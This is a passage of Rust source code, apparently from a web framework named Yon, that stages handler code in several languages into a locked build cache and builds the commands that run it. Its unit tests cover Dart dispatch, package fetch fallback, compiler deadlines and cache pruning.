                    dispatch,
                    "    case '{method}':\n      return _yonCall(handler.{method});\n"
                );
            }
            None => {}
        }
    }
    if code.contains(" __yonDeliver(__YonFrame ") {
        dispatch
            .push_str("    case '__yonDeliver':\n      return handler.__yonDeliver(request);\n");
    }
    body.replace("__YON_HANDLER__", entry.name())
        .replace("//__YON_DISPATCH__\n", &dispatch)
}

enum DartParameters {
    None,
    Frame,
    Native,
}

fn dart_declaration(code: &str, verb: &str) -> Option<DartParameters> {
    if code.contains(&format!(" {verb}(__YonFrame ")) {
        return Some(DartParameters::Frame);
    }
    let mut line_start = 0;
    for line in code.split_inclusive('\n') {
        for (at, _) in line.match_indices(verb) {
            if declares_dart_method_at(line, at, verb) {
                let after_name = &code[line_start + at + verb.len()..];
                let inside = after_name
                    .trim_start()
                    .strip_prefix('(')
                    .unwrap_or_default();
                if inside.trim_start().starts_with(')') {
                    return Some(DartParameters::None);
                }
                if inside.trim_start().starts_with("__YonFrame") {
                    return Some(DartParameters::Frame);
                }
                return Some(DartParameters::Native);
            }
        }
        line_start += line.len();
    }
    None
}

fn declares_dart_method_at(line: &str, at: usize, verb: &str) -> bool {
    let before = &line[..at];
    let after = &line[at + verb.len()..];
    let starts_at_boundary = before
        .chars()
        .next_back()
        .is_none_or(|last| last.is_whitespace() || last == '>' || last == '?');
    if !starts_at_boundary || !after.trim_start().starts_with('(') {
        return false;
    }
    let prefix = before.trim();
    if prefix.ends_with(['.', '=', '(', ',']) {
        return false;
    }
    !prefix
        .split_whitespace()
        .any(|word| matches!(word, "return" | "await" | "throw" | "final" | "var"))
}

fn protocol_prelude(extension: &str, contents: &str, entry: EntryClass) -> String {
    if extension == "dart" {
        return dart_protocol(contents, entry);
    }
    let template = match extension {
        "rs" => include_str!("preludes/yon.rs"),
        "java" => include_str!("preludes/yon.java"),
        "cs" => include_str!("preludes/yon.cs"),
        "php" => include_str!("preludes/yon.php"),
        "kt" => include_str!("preludes/yon.kt"),
        _ => return String::new(),
    };
    let mut prelude = template.replace("__YON_HANDLER__", entry.name());
    if extension == "rs" {
        prelude.push_str(entry.rust_dispatch());
    }
    prelude
}

fn java_preamble_end(source: &str) -> usize {
    let bytes = source.as_bytes();
    let mut at = 0;
    loop {
        at = skip_java_whitespace_and_comments(bytes, at);
        if !starts_java_declaration(bytes, at) {
            return at;
        }
        while bytes.get(at).is_some_and(|byte| *byte != b';') {
            at += 1;
        }
        if at == bytes.len() {
            return at;
        }
        at += 1;
    }
}

fn skip_java_whitespace_and_comments(bytes: &[u8], mut at: usize) -> usize {
    loop {
        while bytes.get(at).is_some_and(u8::is_ascii_whitespace) {
            at += 1;
        }
        if bytes.get(at..at + 2) == Some(b"//") {
            at += 2;
            while bytes.get(at).is_some_and(|byte| *byte != b'\n') {
                at += 1;
            }
            continue;
        }
        if bytes.get(at..at + 2) == Some(b"/*") {
            at += 2;
            while at < bytes.len() && bytes.get(at..at + 2) != Some(b"*/") {
                at += 1;
            }
            at = (at + 2).min(bytes.len());
            continue;
        }
        return at;
    }
}

fn starts_java_declaration(bytes: &[u8], at: usize) -> bool {
    for keyword in [b"package".as_slice(), b"import".as_slice()] {
        let matches_keyword = bytes.get(at..at + keyword.len()) == Some(keyword);
        let followed_by_space = bytes
            .get(at + keyword.len())
            .is_some_and(u8::is_ascii_whitespace);
        if matches_keyword && followed_by_space {
            return true;
        }
    }
    false
}

fn java_runtime_source(contents: &str, protocol: &str) -> String {
    let preamble_end = java_preamble_end(contents);
    let mut combined = String::with_capacity(contents.len() + protocol.len() + 2);
    combined.push_str(&contents[..preamble_end]);
    if !combined.is_empty() && !combined.ends_with('\n') {
        combined.push('\n');
    }
    combined.push_str(protocol);
    if !combined.ends_with('\n') {
        combined.push('\n');
    }
    combined.push_str(&contents[preamble_end..]);
    combined
}

fn stage_with_prelude(
    bytes: &[u8],
    portable: &str,
    cache: &CacheDirectory,
    extension: &str,
) -> Result<PreparedCommand, Failure> {
    let contents = String::from_utf8_lossy(bytes).into_owned();
    let protocol = protocol_prelude(extension, &contents, EntryClass::of(portable));
    let combined = java_runtime_source(&contents, &protocol);
    let digest = crate::compiler::hex_digest(Sha256::digest(combined.as_bytes()));
    let cache_directory = PathBuf::from(&digest);
    let staged = cache_directory.join(format!("Yon.{extension}"));
    let workspace = RuntimeWorkspace::new(portable)?;
    let runtime = workspace.path().join(format!("Yon.{extension}"));
    stage_and_copy(
        cache,
        &staged,
        combined.as_bytes(),
        &runtime,
        &digest,
        portable,
    )?;
    Ok(PreparedCommand {
        interpreter: java_launcher(portable, &runtime),
        workspace,
    })
}

fn java_launcher(portable: &str, runtime: &Path) -> Vec<String> {
    let mut launcher = vec![String::from("java")];
    launcher.extend(TestUnitAsserts::java(portable));
    launcher.push(runtime.to_string_lossy().into_owned());
    launcher
}

fn php_cli_path(path: &Path) -> String {
    #[cfg(windows)]
    {
        path.to_string_lossy().replace('\\', "/")
    }
    #[cfg(not(windows))]
    {
        path.to_string_lossy().into_owned()
    }
}

fn prepare_php(
    cache: &CacheDirectory,
    portable: &str,
    bytes: &[u8],
) -> Result<PreparedCommand, Failure> {
    let contents = std::str::from_utf8(bytes)
        .map_err(|_| invalid_source(portable, "Handler source must be valid UTF-8."))?;
    let runtime = protocol_prelude("php", contents, EntryClass::of(portable));
    let workspace = RuntimeWorkspace::new(portable)?;
    let runtime_copy = stage_script_file(
        cache,
        &workspace,
        ("yon-runtime", "php"),
        &runtime,
        portable,
    )?;
    let handler_copy = stage_script_file(
        cache,
        &workspace,
        ("yon-handler", "php"),
        contents,
        portable,
    )?;
    let entry_copy = stage_script_file(
        cache,
        &workspace,
        ("yon-entry", "php"),
        "<?php\nYonMain::run();\n",
        portable,
    )?;
    let mut interpreter = vec![String::from("php-cgi"), String::from("-C")];
    interpreter.extend(TestUnitAsserts::php(portable));
    interpreter.extend([
        String::from("-d"),
        String::from("display_errors=0"),
        String::from("-d"),
        String::from("log_errors=1"),
        String::from("-d"),
        String::from("error_log="),
        String::from("-d"),
        String::from("html_errors=0"),
        String::from("-d"),
        String::from("expose_php=0"),
        String::from("-d"),
        String::from("max_execution_time=0"),
        String::from("-d"),
        String::from("output_buffering=0"),
        String::from("-d"),
        format!("auto_prepend_file=\"{}\"", php_cli_path(&runtime_copy)),
        String::from("-d"),
        format!("auto_append_file=\"{}\"", php_cli_path(&entry_copy)),
        String::from("-f"),
        php_cli_path(&handler_copy),
    ]);
    Ok(PreparedCommand {
        interpreter,
        workspace,
    })
}

fn prepare_lua(
    cache: &CacheDirectory,
    portable: &str,
    bytes: &[u8],
) -> Result<PreparedCommand, Failure> {
    let contents = std::str::from_utf8(bytes)
        .map_err(|_| invalid_source(portable, "Handler source must be valid UTF-8."))?;
    let workspace = RuntimeWorkspace::new(portable)?;
    let runtime = concat!(
        include_str!("../lua_source/lua_json.lua"),
        include_str!("preludes/yon.lua")
    );
    let runtime_copy =
        stage_script_file(cache, &workspace, ("yon-runtime", "lua"), runtime, portable)?;
    let handler_copy = stage_script_file(
        cache,
        &workspace,
        ("yon-handler", "lua"),
        contents,
        portable,
    )?;
    Ok(PreparedCommand {
        interpreter: vec![
            String::from(crate::lua_source::LuaSource::RUNTIME),
            runtime_copy.to_string_lossy().into_owned(),
            handler_copy.to_string_lossy().into_owned(),
        ],
        workspace,
    })
}

fn stage_script_file(
    cache: &CacheDirectory,
    workspace: &RuntimeWorkspace,
    (name, extension): (&str, &str),
    contents: &str,
    portable: &str,
) -> Result<PathBuf, Failure> {
    let digest = crate::compiler::hex_digest(Sha256::digest(contents.as_bytes()));
    let cache_name = format!("{name}-{digest}");
    let relative = PathBuf::from(format!("{cache_name}.{extension}"));
    let runtime = workspace.path().join(format!("{name}.{extension}"));
    stage_and_copy(
        cache,
        &relative,
        contents.as_bytes(),
        &runtime,
        &cache_name,
        portable,
    )?;
    Ok(runtime)
}

fn ensure_cache_directory(
    cache: &CacheDirectory,
    relative: &Path,
    portable: &str,
) -> Result<(), Failure> {
    match cache.create_directory(relative) {
        Ok(()) => Ok(()),
        Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => {
            let metadata = cache.metadata(relative).map_err(|inspect| {
                cache_failure(portable, "Cannot inspect cached directory", inspect)
            })?;
            if metadata.is_dir() && !metadata.is_symlink() {
                Ok(())
            } else {
                Err(invalid_source(
                    portable,
                    "A handler cache directory is a symlink or unsupported type.",
                ))
            }
        }
        Err(error) => Err(cache_failure(
            portable,
            "Cannot create cache directory",
            error,
        )),
    }
}

fn stage_and_copy(
    cache: &CacheDirectory,
    cache_path: &Path,
    bytes: &[u8],
    runtime_path: &Path,
    lock_prefix: &str,
    portable: &str,
) -> Result<(), Failure> {
    let staging_context = "Cannot coordinate cached staging";
    let prune = acquire_prune_lock(cache, portable)?;
    let content = acquire_named_lock(cache, lock_prefix, portable, staging_context)?;
    prune_cache(cache, portable)?;
    if let Some(parent) = cache_path.parent()
        && !parent.as_os_str().is_empty()
    {
        ensure_cache_directory(cache, parent, portable)?;
    }
    cache
        .stage_bytes(cache_path, bytes)
        .map_err(|error| cache_failure(portable, "Cannot publish cached stage", error))?;
    drop(content);
    prune_cache(cache, portable)?;
    let content = acquire_named_lock(cache, lock_prefix, portable, staging_context)?;
    if cache.read(cache_path).ok().as_deref() != Some(bytes) {
        return Err(invalid_source(
            portable,
            "The cached stage cannot fit within the 512 MiB / 256-entry cache quota.",
        ));
    }
    cache
        .copy_file_out(cache_path, runtime_path)
        .map_err(|error| cache_failure(portable, "Cannot copy cached runtime stage", error))?;
    drop(content);
    drop(prune);
    Ok(())
}

#[derive(Clone, Copy)]
enum EntryClass {
    Handler,
    Middleware,
}

impl EntryClass {
    const HTTP_METHODS: [&str; 7] = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"];
    const MIDDLEWARE_PHASES: [&str; 2] = ["before", "after"];

    fn of(portable: &str) -> Self {
        if is_middleware(Path::new(portable)) {
            return Self::Middleware;
        }
        Self::Handler
    }

    fn name(self) -> &'static str {
        match self {
            Self::Handler => "Handler",
            Self::Middleware => "Middleware",
        }
    }

    fn method_names(self) -> &'static [&'static str] {
        match self {
            Self::Handler => &Self::HTTP_METHODS,
            Self::Middleware => &Self::MIDDLEWARE_PHASES,
        }
    }

    fn rust_dispatch(self) -> &'static str {
        match self {
            Self::Handler => include_str!("preludes/yon_route_dispatch.rs"),
            Self::Middleware => include_str!("preludes/yon_middleware_dispatch.rs"),
        }
    }
}

fn is_middleware(source: &Path) -> bool {
    let at_project_root = source
        .parent()
        .is_none_or(|parent| parent.as_os_str().is_empty());
    if !at_project_root {
        return false;
    }
    source
        .file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| name.starts_with("middleware."))
}

fn language(
    source: &Path,
    bytes: &[u8],
    portable: &str,
    project: &Dir,
    models: &ModelSources,
    source_root: &OwnedSourceRoot,
) -> Result<LanguageResolution, Failure> {
    let name = source.file_name().and_then(|name| name.to_str());
    match name {
        Some("yon.js" | "middleware.js") => return Ok(interpreted(HandlerLanguage::JavaScript)),
        Some("yon.py" | "middleware.py") => return Ok(interpreted(HandlerLanguage::Python)),
        _ => {}
    }
    let Some(extension) = name.and_then(source_extension) else {
        return Err(no_adapter(portable, "has no file extension to resolve"));
    };
    let supported = crate::convention::YonConvention::EXTENSIONS
        .iter()
        .any(|supported| supported.eq_ignore_ascii_case(extension));
    if !supported {
        return Err(unsupported_language(portable, extension));
    }
    if let Some(language) = interpreted_extension(extension) {
        return Ok(interpreted(language));
    }
    if extension.eq_ignore_ascii_case("php") {
        let cache = handler_cache(project, portable)?;
        return prepare_php(&cache, portable, bytes).map(prepared_resolution);
    }
    if crate::lua_source::LuaSource::is_lua(source) {
        let cache = handler_cache(project, portable)?;
        return prepare_lua(&cache, portable, bytes).map(prepared_resolution);
    }
    if extension.eq_ignore_ascii_case("java") {
        let cache = handler_cache(project, portable)?;
        return stage_with_prelude(bytes, portable, &cache, "java").map(prepared_resolution);
    }
    if extension.eq_ignore_ascii_case("cs") {
        let cache = handler_cache(project, portable)?;
        return compile_csharp(bytes, portable, &cache).map(prepared_resolution);
    }
    if extension.eq_ignore_ascii_case("groovy") {
        let cache = handler_cache(project, portable)?;
        return GroovyHandler::compile(bytes, portable, &cache).map(prepared_resolution);
    }
    if crate::fsharp_source::FsharpSource::is_fsharp(source) {
        let cache = handler_cache(project, portable)?;
        return FsharpHandler::compile(bytes, portable, &cache, &models.separate_files())
            .map(prepared_resolution);
    }
    if extension.eq_ignore_ascii_case("go") {
        let cache = handler_cache(project, portable)?;
        let mut program_files = models.separate_files();
        program_files.extend(GoSharedCode::read(source_root.path())?);
        let native = GoNativeModule::read(source_root.path())?;
        return GoHandler::compile(bytes, portable, &cache, &program_files, &native)
            .map(prepared_resolution);
    }
    if let Some(compiler) = built_in_compiler(extension) {
        let cache = handler_cache(project, portable)?;
        let model_files = models.separate_files();
        return compile_handler(compiler, source, bytes, portable, &cache, &model_files)
            .map(prepared_resolution);
    }
    Err(unsupported_language(portable, extension))
}

fn interpreted_extension(extension: &str) -> Option<HandlerLanguage> {
    if extension.eq_ignore_ascii_case("js") {
        return Some(HandlerLanguage::JavaScript);
    }
    if extension.eq_ignore_ascii_case("py") {
        return Some(HandlerLanguage::Python);
    }
    if extension.eq_ignore_ascii_case("rb") {
        return Some(HandlerLanguage::Ruby);
    }
    if extension.eq_ignore_ascii_case("ts") {
        return Some(HandlerLanguage::TypeScript);
    }
    None
}

fn source_extension(name: &str) -> Option<&str> {
    let (_, extension) = name.rsplit_once('.')?;
    if extension.is_empty() || !extension.bytes().all(|byte| byte.is_ascii_alphanumeric()) {
        return None;
    }
    Some(extension)
}

fn interpreted(language: HandlerLanguage) -> LanguageResolution {
    (language, Vec::new(), false, None)
}

fn prepared_resolution(prepared: PreparedCommand) -> LanguageResolution {
    (
        HandlerLanguage::Direct,
        prepared.interpreter,
        true,
        Some(prepared.workspace),
    )
}

fn unsupported_language(portable: &str, extension: &str) -> Failure {
    Failure::one(diagnostic(
        2003,
        format!("Handler source '{portable}' is written in a language Yon does not run."),
        Some(format!(
            "Yon runs {known}; '.{extension}' is not one of its framework-owned handler languages. \
             Call another program explicitly through relay(...) from a supported Handler.",
            known = known_extensions()
        )),
        None,
    ))
}

fn known_extensions() -> String {
    let mut names = Vec::new();
    for extension in crate::convention::YonConvention::EXTENSIONS {
        names.push(format!("yon.{extension}"));
    }
    names.join(", ")
}

fn no_adapter(portable: &str, reason: &str) -> Failure {
    Failure::one(diagnostic(
        2003,
        format!("Handler source '{portable}' {reason}."),
        Some(format!(
            "Use one of the framework-owned route names: {known}. Reach a program in any \
             other language with an explicit relay(...) call.",
            known = known_extensions(),
        )),
        source_span(portable, 0, portable.len()),
    ))
}

fn invalid_source(path: &str, message: &str) -> Failure {
    Failure::one(diagnostic(
        2004,
        format!("{message} Source: '{path}'."),
        Some(String::from(
            "Use a regular, UTF-8, project-contained source no larger than 1 MiB.",
        )),
        source_span(path, 0, path.len()),
    ))
}

fn source_io<T>(result: std::io::Result<T>, path: &str) -> Result<T, Failure> {
    result.map_err(|error| {
        Failure::one(diagnostic(
            2001,
            format!("Cannot inspect handler source '{path}': {error}"),
            None,
            source_span(path, 0, path.len()),
        ))
    })
}

fn portable(path: &Path) -> String {
    let mut parts = Vec::new();
    for component in path.components() {
        if let Component::Normal(value) = component
            && let Some(text) = value.to_str()
        {
            parts.push(text);
        }
    }
    parts.join("/")
}

#[cfg(test)]
mod tests {
    #![allow(clippy::expect_used)]

    use super::super::cache::{CacheDirectory, CacheLock, OwnedCacheEntry};
    use super::{
        CompilerOutput, DartPackages, EntryClass, HandlerLanguage, HandlerSource,
        bounded_compiler_output_with_limits, compiled_digest, csharp_digest, dart_prelude_parts,
        dart_protocol, has_own_entry_point, java_runtime_source, valid_csharp_cache,
    };
    #[cfg(unix)]
    use std::os::unix::process::ExitStatusExt as _;
    #[cfg(windows)]
    use std::os::windows::process::ExitStatusExt as _;

    struct FakePub {
        calls: Vec<Vec<String>>,
        answers: Vec<Result<CompilerOutput, String>>,
    }

    impl FakePub {
        const PORTABLE: &str = "server/routes/index.dart";

        fn answering(answers: Vec<Result<CompilerOutput, String>>) -> Self {
            Self {
                calls: Vec::new(),
                answers,
            }
        }

        fn output(code: u8, stderr: &str) -> CompilerOutput {
            CompilerOutput {
                status: std::process::ExitStatus::from_raw(code.into()),
                stdout: Vec::new(),
                stderr: stderr.as_bytes().to_vec(),
                overflow: false,
            }
        }

        fn run(&mut self, arguments: &[String]) -> Result<CompilerOutput, String> {
            self.calls.push(arguments.to_vec());
            self.answers.remove(0)
        }

        fn fetch(&mut self) -> Result<(), crate::Failure> {
            DartPackages::fetch_with(|arguments| self.run(arguments), Self::PORTABLE)
        }
    }

    #[test]
    fn a_failed_dart_online_fetch_keeps_the_offline_failure_that_caused_it() {
        let mut pub_tool = FakePub::answering(vec![
            Ok(FakePub::output(
                1,
                "Could not find package shelf in the offline cache.\n",
            )),
            Ok(FakePub::output(
                1,
                "Got socket error trying to find package shelf.\n",
            )),
        ]);
        let failure = pub_tool.fetch().expect_err("both fetches failed");
        assert_eq!(
            pub_tool.calls,
            [vec!["pub", "get", "--offline"], vec!["pub", "get"]]
        );
        let diagnostics = failure.diagnostics();
        assert_eq!(diagnostics.len(), 2, "{failure}");
        assert!(
            diagnostics[0]
                .message
                .contains("Got socket error trying to find package shelf."),
            "the online failure stays first: {failure}"
        );
        assert!(
            diagnostics[1]
                .message
                .contains("offline package fetch failed first"),
            "{failure}"
        );
        assert!(
            diagnostics[1]
                .message
                .contains("Could not find package shelf in the offline cache."),
            "{failure}"
        );
    }

    #[test]
    fn the_handler_compile_deadline_defaults_to_a_minute_and_stays_bounded() {
        let cases = [
            (None, 60),
            (Some("240"), 240),
            (Some(" 90 "), 90),
            (Some("0"), 60),
            (Some("-5"), 60),
            (Some("soon"), 60),
            (Some("100000"), 900),
        ];
        for (configured, seconds) in cases {
            assert_eq!(
                super::CompilerOutput::deadline_from(configured),
                std::time::Duration::from_secs(seconds),
                "{configured:?}"
            );
        }
    }

    #[test]
    fn a_dart_offline_start_failure_is_kept_when_the_online_fetch_fails() {
        let mut pub_tool = FakePub::answering(vec![
            Err(String::from(
                "compiler exceeded its 60000 millisecond deadline",
            )),
            Ok(FakePub::output(
                1,
                "Got socket error trying to find package shelf.\n",
            )),
        ]);
        let failure = pub_tool.fetch().expect_err("both fetches failed");
        let report = failure.to_string();
        assert!(
            report.contains("compiler exceeded its 60000 millisecond deadline"),
            "{report}"
        );
        assert!(report.contains("Got socket error"), "{report}");
    }

    #[test]
    fn a_dart_fetch_falls_back_online_only_when_the_offline_fetch_fails() {
        let mut cached = FakePub::answering(vec![Ok(FakePub::output(0, ""))]);
        cached.fetch().expect("the offline cache is enough");
        assert_eq!(cached.calls, [vec!["pub", "get", "--offline"]]);

        let mut fetched = FakePub::answering(vec![
            Ok(FakePub::output(
                1,
                "Could not find package shelf in the offline cache.\n",
            )),
            Ok(FakePub::output(0, "")),
        ]);
        fetched.fetch().expect("the online fetch recovers");
        assert_eq!(
            fetched.calls,
            [vec!["pub", "get", "--offline"], vec!["pub", "get"]]
        );
    }

    #[test]
    fn a_dart_dispatch_names_only_the_verbs_the_handler_declares() {
        let handler = concat!(
            "class Handler {\n",
            "  Object? GET(Request request) => {};\n",
            "  Future<Map<String, Object?>> POST(Request request) async => {};\n",
            "  Object? xGET(Request request) => null;\n",
            "  Object? other(Request request) { return handler.PUT(request); }\n",
            "  // DELETE(Request request) is only a comment\n",
            "  String note = 'PATCH(request)';\n",
            "}\n",
        );
        let (head, _) = dart_prelude_parts();
        let body = dart_protocol(handler, EntryClass::Handler);
        assert!(head.contains("import 'dart:io' as yon_io;"), "{head}");
        assert!(
            head.lines()
                .map(str::trim)
                .filter(|line| !line.is_empty() && !line.starts_with("//"))
                .all(|line| line.starts_with("import ")),
            "the head is imports alone, since Dart puts them before any declaration: {head}"
        );
        for declared in ["GET", "POST"] {
            assert!(
                body.contains(&format!("case '{declared}':")),
                "{declared}: {body}"
            );
        }
        for absent in ["PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"] {
            assert!(
                !body.contains(&format!("case '{absent}':")),
                "{absent}: {body}"
            );
        }
        assert!(
            !body.contains("__YON_"),
            "every placeholder is filled: {body}"
        );
    }

    #[test]
    fn a_dart_middleware_dispatch_names_only_its_declared_phases() {
        let middleware = concat!(
            "class Middleware {\n",
            "  Response before(Request request) => Response(204);\n",
            "  Object? GET(Request request) => null;\n",
            "}\n",
        );
        let body = dart_protocol(middleware, EntryClass::Middleware);
        assert!(body.contains("case 'before':"), "{body}");
        assert!(body.contains("Middleware()"), "{body}");
        for absent in ["after", "GET"] {
            assert!(
                !body.contains(&format!("case '{absent}':")),
                "{absent}: {body}"
            );
        }
    }

    #[test]
    fn a_dart_handler_may_not_declare_main() {
        for own in [
            "void main() {}\n",
            "Future<void> main(List<String> args) async {}\n",
        ] {
            assert!(has_own_entry_point(own.as_bytes(), "dart"), "{own}");
        }
        for fine in [
            "class Handler {\n  void main() {}\n}\n",
            "// void main() {}\n",
            "final domain = 'x';\n",
        ] {
            assert!(!has_own_entry_point(fine.as_bytes(), "dart"), "{fine}");
        }
    }
    use std::fs;
    use std::path::{Path, PathBuf};
    use std::time::Duration;

    struct TemporaryCachePath {
        guard: OwnedCacheEntry,
    }

    impl TemporaryCachePath {
        fn file(path: &Path) -> Self {
            let (cache, relative) = cache_child(path);
            Self {
                guard: cache.adopt_file(&relative).expect("adopt file"),
            }
        }

        fn directory(path: &Path) -> Self {
            let (cache, relative) = cache_child(path);
            Self {
                guard: cache.adopt_directory(&relative).expect("adopt directory"),
            }
        }
    }

    impl Drop for TemporaryCachePath {
        fn drop(&mut self) {
            let _ = &self.guard;
        }
    }

    fn cache_child(path: &Path) -> (CacheDirectory, std::path::PathBuf) {
        let parent = path.parent().expect("cache parent");
        let relative = std::path::PathBuf::from(path.file_name().expect("cache child"));
        (
            CacheDirectory::open_test_root(parent).expect("cache capability"),
            relative,
        )
    }

    #[test]
    fn java_runtime_keeps_declarations_first_and_launcher_before_authored_types() {
        let authored = "/* license */\npackage example;\nimport java.util.Map;\n\nclass Helper {}\n\nclass Handler {}\n";
        let protocol = "final class YonLauncher { public static void main(String[] args) {} }\n";
        let staged = java_runtime_source(authored, protocol);

        let package = staged.find("package example;").expect("package");
        let import = staged.find("import java.util.Map;").expect("import");
        let launcher = staged.find("final class YonLauncher").expect("launcher");
        let helper = staged.find("class Helper").expect("authored helper");
        assert!(package < import && import < launcher && launcher < helper);
    }

    fn acquire_cache_lock(path: &Path, portable: &str) -> Result<CacheLock, crate::Failure> {
        acquire_cache_lock_with_wait(path, portable, Duration::from_mins(1))
    }

    fn acquire_cache_lock_with_wait(
        path: &Path,
        portable: &str,
        wait: Duration,
    ) -> Result<CacheLock, crate::Failure> {
        let (cache, relative) = cache_child(path);
        cache.acquire_lock(&relative, wait).map_err(|error| {
            super::invalid_source(
                portable,
                &format!("Cannot coordinate the handler build cache: {error}"),
            )
        })
    }

    fn acquire_cache_lock_with_initializer<F>(
        path: &Path,
        portable: &str,
        wait: Duration,
        initialize: F,
    ) -> Result<CacheLock, crate::Failure>
    where
        F: Fn(&mut cap_std::fs::File, u32, u64, &str) -> std::io::Result<()>,
    {
        let (cache, relative) = cache_child(path);
        cache
            .acquire_lock_with(&relative, wait, initialize)
            .map_err(|error| {
                super::invalid_source(
                    portable,
                    &format!("Cannot coordinate the handler build cache: {error}"),
                )
            })
    }

    fn prune_handler_cache_with_limits(
        directory: &Path,
        max_entries: usize,
        max_bytes: u64,
    ) -> std::io::Result<()> {
        CacheDirectory::open_test_root(directory)?.prune_with_limits(max_entries, max_bytes)
    }

    fn prune_handler_cache_with_remover<F>(
        directory: &Path,
        max_entries: usize,
        max_bytes: u64,
        remove: F,
    ) -> std::io::Result<()>
    where
        F: Fn(&Path) -> std::io::Result<()>,
    {
        prune_handler_cache_with_operations(directory, max_entries, max_bytes, remove, path_usage)
    }

    fn prune_handler_cache_with_operations<F, M>(
        directory: &Path,
        max_entries: usize,
        max_bytes: u64,
        remove: F,
        measure: M,
    ) -> std::io::Result<()>
    where
        F: Fn(&Path) -> std::io::Result<()>,
        M: Fn(&Path) -> std::io::Result<(usize, u64)>,
    {
        let cache = CacheDirectory::open_test_root(directory)?;
        cache.prune_with(
            max_entries,
            max_bytes,
            |_cache, relative| remove(&directory.join(relative)),
            |_cache, relative| measure(&directory.join(relative)),
        )
    }

    fn path_usage(path: &Path) -> std::io::Result<(usize, u64)> {
        let (cache, relative) = cache_child(path);
        cache.path_usage(&relative)
    }

    fn reserve_attempt_directory(
        path: &Path,
        portable: &str,
        purpose: &str,
    ) -> Result<OwnedCacheEntry, crate::Failure> {
        let (cache, relative) = cache_child(path);
        cache.create_owned_directory(&relative).map_err(|error| {
            super::invalid_source(
                portable,
                &format!("Cannot reserve {purpose} attempt directory: {error}"),
            )
        })
    }

    fn write_owned_file(path: &Path, bytes: &[u8], portable: &str) -> Result<(), crate::Failure> {
        let (cache, relative) = cache_child(path);
        let mut guard = cache
            .write_owned_for_test(&relative, bytes)
            .map_err(|error| {
                super::invalid_source(
                    portable,
                    &format!("Cannot create owned cache file: {error}"),
                )
            })?;
        guard.publish();
        Ok(())
    }

    fn stage_cached_bytes(path: &Path, bytes: &[u8], portable: &str) -> Result<(), crate::Failure> {
        let (cache, relative) = cache_child(path);
        cache.stage_bytes(&relative, bytes).map_err(|error| {
            super::invalid_source(portable, &format!("Cannot publish cache stage: {error}"))
        })
    }

    #[test]
    fn a_missing_compiler_is_the_missing_toolchain_error_for_every_compiled_language() {
        let compilers = [
            ("rustc", "Yon Rust compiler 'rustc'", "Install Rust"),
            (
                "kotlinc",
                "Yon Kotlin compiler 'kotlinc'",
                "Install the Kotlin compiler",
            ),
            ("dart", "Yon Dart compiler 'dart'", "Install the Dart SDK"),
            ("dotnet", "Yon C# runtime 'dotnet'", "Install the .NET SDK"),
            ("go", "Yon Go compiler 'go'", "Install Go 1.27 or newer"),
        ];
        for (program, label, help) in compilers {
            let spawn = super::bounded_compiler_output("tachyon-missing-compiler", &[], None);
            let failure =
                super::check_compiler_output(program, spawn, "server/workers/handler.src")
                    .expect_err("a missing compiler fails");
            let diagnostic = &failure.diagnostics()[0];
            assert_eq!(diagnostic.code.to_string(), "TY2112", "{failure}");
            let message = format!("Required {label} was not found.");
            assert_eq!(diagnostic.message, message, "{failure}");
            let shown_help = diagnostic.help.as_deref().unwrap_or_default();
            assert!(shown_help.starts_with(help), "{program}: {shown_help}");
            assert_eq!(diagnostic.spans[0].file, "server/workers/handler.src");
        }
    }

    #[test]
    fn compiler_execution_has_strict_deadline_and_output_caps() {
        let timeout = bounded_compiler_output_with_limits(
            "sh",
            &[String::from("-c"), String::from("sleep 2")],
            None,
            Duration::from_millis(25),
            64,
        )
        .expect_err("compiler deadline");
        assert!(timeout.contains("25 millisecond"), "{timeout}");

        let output = bounded_compiler_output_with_limits(
            "sh",
            &[
                String::from("-c"),
                String::from("printf '%0200d' 0; printf '%0200d' 0 >&2"),
            ],
            None,
            Duration::from_secs(2),
            64,
        )
        .expect("bounded output");
        assert!(output.overflow);
        assert_eq!(output.stdout.len(), 64);
        assert_eq!(output.stderr.len(), 64);
    }

    #[cfg(unix)]
    #[test]
    fn compiler_deadline_reaps_descendants_and_settles_inherited_pipes() {
        let root = tempfile::tempdir().expect("compiler probe");
        let pid_file = root.path().join("descendant.pid");
        let script = format!("sleep 60 & echo $! > '{}'; wait", pid_file.display());
        bounded_compiler_output_with_limits(
            "sh",
            &[String::from("-c"), script],
            None,
            Duration::from_millis(100),
            64,
        )
        .expect_err("compiler group deadline");
        let pid = fs::read_to_string(&pid_file).expect("descendant pid");
        for _ in 0..50 {
            if !std::process::Command::new("kill")
                .args(["-0", pid.trim()])
                .status()
                .is_ok_and(|status| status.success())
            {
                return;
            }
            std::thread::sleep(Duration::from_millis(10));
        }
        panic!("compiler descendant {pid} survived process-group timeout");
    }

    #[test]
    fn cache_pruning_is_deterministic_and_honors_entry_and_byte_limits() {
        let root = tempfile::tempdir().expect("cache");
        for (name, bytes) in [("a", 40), ("b", 40), ("c", 40)] {
            fs::write(root.path().join(name), vec![b'x'; bytes]).expect("entry");
            std::thread::sleep(Duration::from_millis(5));
        }
        fs::write(root.path().join("active.lock"), vec![b'x'; 1_000]).expect("lock");
        prune_handler_cache_with_limits(root.path(), 2, 70).expect("prune");
        assert!(!root.path().join("a").exists());
        assert!(!root.path().join("b").exists());
        assert!(root.path().join("c").exists());
        assert!(root.path().join("active.lock").exists());
    }

    #[test]
    fn cache_pruning_never_removes_an_active_digest_attempt() {
        let root = tempfile::tempdir().expect("cache");
        fs::write(root.path().join("active.lock"), b"").expect("active lock");
        fs::write(root.path().join("active.bin"), vec![b'a'; 80]).expect("active artifact");
        fs::write(root.path().join(".active.1.tmp"), vec![b'a'; 80]).expect("active temp");
        fs::write(root.path().join("active_1_tmp_yon.rs"), vec![b'a'; 80]).expect("active stage");
        fs::write(root.path().join("inactive.bin"), vec![b'i'; 80]).expect("inactive");
        prune_handler_cache_with_limits(root.path(), 0, 0).expect("prune inactive entries");
        assert!(root.path().join("active.bin").exists());
        assert!(root.path().join(".active.1.tmp").exists());
        assert!(root.path().join("active_1_tmp_yon.rs").exists());
        assert!(!root.path().join("inactive.bin").exists());
    }

    fn build_during_pressure(
        cache: &Path,
        registered: &std::sync::Barrier,
        pruned: &std::sync::Barrier,
    ) {
        let global = acquire_cache_lock(&cache.join(".prune.lock"), "a").expect("global");
        let _active = acquire_cache_lock(&cache.join("a.lock"), "a").expect("a lock");
        drop(global);
